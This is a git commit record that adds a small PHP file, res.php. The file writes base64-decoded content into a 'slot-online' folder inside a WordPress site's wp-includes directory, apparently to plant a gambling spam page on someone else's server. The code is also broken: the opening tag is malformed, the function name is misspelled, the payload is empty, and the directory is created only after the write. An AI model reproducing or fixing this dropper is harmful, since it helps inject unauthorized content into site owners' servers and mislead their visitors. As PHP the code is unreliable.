fcce5f8f5d5387d8e9005e60a8ca514fe94bbb9b
hime-yuki77 <123535502+hime-yuki77@users.noreply.github.com>
2023-01-28 17:54:54 +0700

    Create res.php

---
+++ res.php
@@ -0,0 +1,5 @@
+<php
+     $my = base64_decode("");
+ file_put_content('/home/disdik/public_html/wp-includes/slot-online/index.php', $my);
+ mkdir('/home/disdik/public_html/wp-includes/slot-online/');
+?>
